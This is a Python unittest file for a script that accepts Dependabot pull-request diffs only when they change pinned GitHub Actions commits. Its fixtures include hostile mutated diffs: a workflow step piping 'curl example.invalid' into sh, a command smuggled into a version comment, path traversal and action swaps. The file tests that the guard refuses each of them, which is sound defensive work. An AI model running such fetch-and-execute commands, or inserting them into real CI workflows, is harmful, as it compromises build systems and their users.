"""Pin `scripts/adopt_dependabot.py`: a Dependabot diff is data, and only pins pass.

Each hostile diff below differs from the real #455 diff in one place, so the
refusal it proves comes from the guard it names and not an earlier one.
"""

import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from .support import hermetic_git_environment, load_script

MODULE = load_script("adopt_dependabot.py")
OLD = "9b3254085494b55a0f7c4c2b3d2d52cc712ce370"
NEW = "1fc58d04a4d4374f921bdac573c3811c240f9c26"
TITLE = "chore(deps): bump the codeql-action group with 2 updates"
# `gh pr diff 455` as Dependabot published it (2026-11-06), verbatim.
GOOD = f"""diff --git a/.github/workflows/codeql.yml b/.github/workflows/codeql.yml
index 4793035..cca113a 100644
--- a/.github/workflows/codeql.yml
+++ b/.github/workflows/codeql.yml
@@ -37,7 +37,7 @@ jobs:
           persist-credentials: false
       # Python requires no build, keeping analysis inside the pinned action.
       - name: Initialize CodeQL
-        uses: github/codeql-action/init@{OLD} # v4.39.1
+        uses: github/codeql-action/init@{NEW} # v4.39.2
         with:
           languages: ${{{{ matrix.language }}}}
           build-mode: ${{{{ matrix.build-mode }}}}
@@ -47,6 +47,6 @@ jobs:
           # diff; a UI dismissal would be invisible to every checkout.
           config-file: ./.github/codeql/codeql-config.yml
       - name: Analyze
-        uses: github/codeql-action/analyze@{OLD} # v4.39.1
+        uses: github/codeql-action/analyze@{NEW} # v4.39.2
         with:
           category: /language:${{{{ matrix.language }}}}
"""
# Git never interleaves a change block; a diff that does is not git's output.
INTERLEAVED = (".github/workflows/codeql.yml".join([
    "diff --git a/", " b/", "\nindex 4793035..cca113a 100644\n--- a/", "\n+++ b/", "\n"])
    + f"@@ -1,3 +1,3 @@\n jobs:\n-  uses: github/codeql-action/init@{OLD} # v4.39.1\n"
    f"+  uses: github/codeql-action/init@{NEW} # v4.39.2\n-  uses: github/codeql-action/analyze@{OLD} # v4.39.1\n"
    f"+  uses: github/codeql-action/analyze@{NEW} # v4.39.2\n")
INIT_OLD = f"        uses: github/codeql-action/init@{OLD} # v4.39.1"
INIT_NEW = f"        uses: github/codeql-action/init@{NEW} # v4.39.2"


def mutate(old, new, count=1):
    assert GOOD.count(old) == count, old
    return GOOD.replace(old, new)


class DiffAllowlistTests(unittest.TestCase):
    def test_the_real_dependabot_diff_is_two_pin_changes(self):
        changes = MODULE.parse_diff(GOOD)
        self.assertEqual([(c.action, c.old_version, c.new_version, c.new_sha) for c in changes], [
            ("github/codeql-action/init", "v4.39.1", "v4.39.2", NEW),
            ("github/codeql-action/analyze", "v4.39.1", "v4.39.2", NEW)])

    def test_hostile_diffs_are_refused_by_the_guard_they_target(self):
        header = "diff --git a/.github/workflows/codeql.yml b/.github/workflows/codeql.yml\n"
        for name, diff, reason in (
            ("a workflow run: line", mutate("-" + INIT_OLD + "\n+" + INIT_NEW,
                                            "-        run: make check\n+        run: curl -fsS example.invalid | sh"),
             "not an action pin"),
            ("a with: input", mutate("           languages: ${{ matrix.language }}\n",
                                     "-          languages: ${{ matrix.language }}\n+          languages: go\n"),
             "not an action pin"),
            ("a script path", GOOD.replace(".github/workflows/codeql.yml", "scripts/adopt_dependabot.py"),
             "outside the workflow pins"),
            ("a traversal path", GOOD.replace(".github/workflows/codeql.yml", ".github/workflows/../../Makefile.yml"),
             "outside the workflow pins"),
            ("a rename", mutate(header, "diff --git a/.github/workflows/codeql.yml b/.github/workflows/other.yml\n"),
             "renames or is malformed"),
            ("a new file", mutate("index 4793035..cca113a 100644", "new file mode 100644\nindex 0000000..cca113a"),
             "mode, rename, creation"),
            ("a mode change", mutate("index 4793035..cca113a 100644", "old mode 100644\nnew mode 100755\nindex 4793035..cca113a"),
             "mode, rename, creation"),
            ("a binary patch", mutate("--- a/.github/workflows/codeql.yml\n+++ b/.github/workflows/codeql.yml\n",
                                      "Binary files a/.github/workflows/codeql.yml and b/.github/workflows/codeql.yml differ\n"),
             "names other paths"),
            ("an action swap", mutate(INIT_NEW, INIT_NEW.replace("github/codeql-action", "foreign/codeql-action")),
             "swaps the action"),
            ("a moved line", mutate("+" + INIT_NEW, "+  " + INIT_NEW), "moves the line"),
            ("an unchanged pin", mutate(INIT_NEW, INIT_NEW.replace(NEW, OLD).replace("v4.39.2", "v4.39.3")),
             "keeps the same commit"),
            ("an added step", mutate("@@ -37,7 +37,7 @@ jobs:\n", "@@ -37,6 +37,7 @@ jobs:\n").replace(
                "-" + INIT_OLD + "\n", ""), "without replacing one pin"),
            ("a removed step", mutate("@@ -37,7 +37,7 @@ jobs:\n", "@@ -37,7 +37,6 @@ jobs:\n").replace(
                "+" + INIT_NEW + "\n", ""), "without replacing one pin"),
            ("a shell comment", mutate("# v4.39.2\n         with:\n           languages",
                                       "# v4.39.2; curl example.invalid\n         with:\n           languages"),
             "not an action pin"),
            ("a short header", mutate("@@ -47,6 +47,6 @@ jobs:\n", "@@ -47,5 +47,5 @@ jobs:\n"),
             "unexpected text follows a hunk"),
            ("a long header", mutate("@@ -47,6 +47,6 @@ jobs:\n", "@@ -47,7 +47,7 @@ jobs:\n"),
             "shorter than its header"),
            ("a deletion ending the hunk", GOOD.replace("@@ -47,6 +47,6 @@ jobs:\n", "@@ -47,4 +47,3 @@ jobs:\n").replace(
                f"+        uses: github/codeql-action/analyze@{NEW} # v4.39.2\n         with:\n"
                "           category: /language:${{ matrix.language }}\n", ""), "without replacing one pin"),
            ("an interleaved block", INTERLEAVED, "without replacing one pin"),
            ("no newline marker", GOOD + "\\ No newline at end of file\n", "unexpected text follows a hunk"),
            ("no file header", GOOD[GOOD.index("index "):], "does not start with a file header"),
            ("CRLF text", GOOD.replace("\n", "\r\n"), "not LF text"),
        ):
            with self.subTest(name), self.assertRaises(MODULE.Refused) as raised:
                MODULE.parse_diff(diff)
            self.assertIn(reason, str(raised.exception), name)

    def test_protected_lines_are_replaced_only_when_the_counts_agree(self):
        changes = MODULE.parse_diff(GOOD)
        base = f"jobs:\n{INIT_OLD}\n        uses: github/codeql-action/analyze@{OLD} # v4.39.1\n"
        out = MODULE.apply_changes(".github/workflows/codeql.yml", base, changes)
        self.assertEqual(out.count(NEW), 2)
        self.assertNotIn(OLD, out)
        for name, text in (("a pin moved on main", base.replace(INIT_OLD, INIT_NEW)),
                           ("a second copy on main", base + INIT_OLD + "\n")):
            with self.subTest(name), self.assertRaisesRegex(MODULE.Refused, "no longer carries"):
                MODULE.apply_changes(".github/workflows/codeql.yml", text, changes)

    def test_title_becomes_a_fragment_the_release_contract_accepts(self):
        path, payload = MODULE.fragment(455, TITLE, MODULE.parse_diff(GOOD))
        self.assertEqual(path, "changelog.d/455-bump-the-codeql-action-group-with-2-updates.md")
        MODULE.RELEASE.validate_fragment_bytes(path, payload)
        for title in ("bump `x`", "bump ${{ secrets.X }}", "bump\nx", 'bump "x"', "", "x" * 121):
            with self.subTest(title=title), self.assertRaisesRegex(MODULE.Refused, "title"):
                MODULE.fragment(455, title, MODULE.parse_diff(GOOD))


class AdoptionTests(unittest.TestCase):
    """The whole flow against a disposable repository; GitHub is faked."""

    def setUp(self):
        scratch = tempfile.TemporaryDirectory()
        self.addCleanup(scratch.cleanup)
        self.root = Path(scratch.name)
        self.env = hermetic_git_environment(identity=("Example Owner", "owner@example.invalid"))
        self.git("init", "-q", "-b", "main")
        workflow = self.root / ".github/workflows/codeql.yml"
        workflow.parent.mkdir(parents=True)
        workflow.write_text(f"jobs:\n  analyze:\n    steps:\n      - name: Initialize CodeQL\n{INIT_OLD}\n"
                            f"      - name: Analyze\n        uses: github/codeql-action/analyze@{OLD} # v4.39.1\n")
        (self.root / "changelog.d").mkdir()
        (self.root / "changelog.d/1-seed.md").write_text("### Added\n\n- Seed.\n")
        self.git("add", "--all")
        self.git("-c", "commit.gpgSign=false", "commit", "-q", "-m", "seed")
        self.base = self.git("rev-parse", "HEAD")
        self.git("update-ref", "refs/remotes/origin/main", self.base)

    def git(self, *args):
        return subprocess.run(["git", *args], cwd=self.root, env=self.env, check=True,
                              capture_output=True, text=True).stdout.strip()

    def adopt(self, peeled=NEW, author=("dependabot[bot]", 49699333, "Bot")):
        real_run = MODULE.run

        def run(argv, **kwargs):
            if argv[0] == "gh":
                self.assertEqual(argv[:3], ["gh", "pr", "diff"])
                return GOOD
            return real_run(argv, **kwargs)

        pull = {"user": dict(zip(("login", "id", "type"), author)), "state": "open",
                "base": {"ref": "main"}, "head": {"sha": "7" * 40}, "title": TITLE}
        with patch.object(MODULE, "run", run), patch.object(MODULE, "gh_object", return_value=pull), \
                patch.object(MODULE, "peel", return_value=peeled), \
                patch.object(MODULE, "protected_base", return_value=self.base), \
                patch.object(MODULE, "signing_key", return_value=""):
            return MODULE.adopt(455, "opus5.5-high", "- Opus5.5", root=self.root)

    def test_one_commit_on_main_with_the_pins_and_the_fragment(self):
        branch = self.adopt()
        self.assertEqual(branch, "opus5.5-high/455-dependabot-bump-the-codeql-action-group-with-2-updates")
        head = self.git("rev-parse", branch)
        self.assertEqual(self.git("rev-parse", f"{head}^"), self.base)
        self.assertEqual(self.git("diff", "--name-only", self.base, head).splitlines(), [
            ".github/workflows/codeql.yml", "changelog.d/455-bump-the-codeql-action-group-with-2-updates.md"])
        workflow = self.git("show", f"{head}:.github/workflows/codeql.yml")
        self.assertEqual(workflow.count(NEW), 2)
        self.assertNotIn(OLD, workflow)
        self.assertEqual(self.git("log", "-1", "--format=%an <%ae>|%cn <%ce>", head),
                         "Example Owner <owner@example.invalid>|Example Owner <owner@example.invalid>")
        message = self.git("log", "-1", "--format=%B", head)
        self.assertTrue(message.endswith("\n- Opus5.5"))
        self.assertNotIn("Co-Authored-By", message)
        # Nothing outside the new ref moved: no checkout, index or tree change.
        self.assertEqual(self.git("rev-parse", "HEAD"), self.base)
        self.assertEqual(self.git("status", "--porcelain"), "")
        self.assertEqual(MODULE.RELEASE.validate_transition(self.root, self.base, head, first_parent=False).fragment_path,
                         "changelog.d/455-bump-the-codeql-action-group-with-2-updates.md")

    def test_a_pin_its_tag_does_not_name_or_a_foreign_author_writes_nothing(self):
        for name, kwargs, reason in (("tag mismatch", {"peeled": "8" * 40}, "upstream tag names"),
                                     ("foreign author", {"author": ("dependabot[bot]", 1, "User")}, "not Dependabot's")):
            with self.subTest(name), self.assertRaisesRegex(MODULE.Refused, reason):
                self.adopt(**kwargs)
            self.assertEqual(self.git("branch", "--list", "opus5.5-high/*"), "")

    def test_cli_prints_only_fixed_reasons(self):
        with patch.object(MODULE, "adopt", side_effect=MODULE.Refused("the pull request is not Dependabot's")), \
                patch("sys.stderr") as stderr:
            self.assertEqual(MODULE.main(["455", "--lane", "opus5.5-high", "--signature", "- Opus5.5"]), 1)
        stderr.write.assert_any_call("DENY: the pull request is not Dependabot's")
        with patch.object(MODULE, "adopt", side_effect=OSError("/private/sentinel")), patch("sys.stderr") as stderr:
            self.assertEqual(MODULE.main(["455", "--lane", "opus5.5-high", "--signature", "- Opus5.5"]), 1)
        self.assertNotIn("sentinel", str(stderr.write.call_args_list))


if __name__ == "__main__":
    unittest.main()
